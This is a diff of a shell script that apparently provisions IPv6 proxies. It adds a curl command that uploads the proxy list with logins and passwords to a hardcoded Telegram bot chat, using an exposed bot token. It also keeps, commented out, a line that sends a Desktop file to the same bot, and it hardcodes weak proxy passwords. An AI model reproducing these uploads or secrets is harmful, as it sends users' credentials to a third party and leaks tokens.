@@ -74,16 +74,17 @@ upload_proxy() {
     #local PASS=$(random)
     #zip --password $PASS proxy.zip proxy.txt
     #URL=$(curl -F "file=@proxy.zip" https://file.io)
-	#URL=$(curl -F "file=@proxy.txt" https://file.io)
+    #URL=$(curl -F "file=@proxy.txt" https://file.io)
     #echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
     #echo "Download zip archive from: ${URL}"
     #echo "Password: ${PASS}"
-	URL=$(curl -F "document=@proxy.txt" https://api.telegram.org/5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument?chat_id=956415922)
-	curl -v -F "chat_id=956415922" -F document=@/Users/users/Desktop/file.txt https://api.telegram.org/5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument
+    #URL=$(curl -F "document=@proxy.txt" https://api.telegram.org/5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument?chat_id=956415922)
+    #curl -v -F "chat_id=956415922" -F document=@/Users/users/Desktop/file.txt https://api.telegram.org/5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument
+    curl -F chat_id=956415922 -F document=@proxy.txt https://api.telegram.org/5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument
 }
 gen_data() {
     seq $FIRST_PORT $LAST_PORT | while read port; do
-        echo "n2l/N2L123/$IP4/$port/$(gen64 $IP6)"
+        echo "yag/abc@123/$IP4/$port/$(gen64 $IP6)"
     done
 }
 
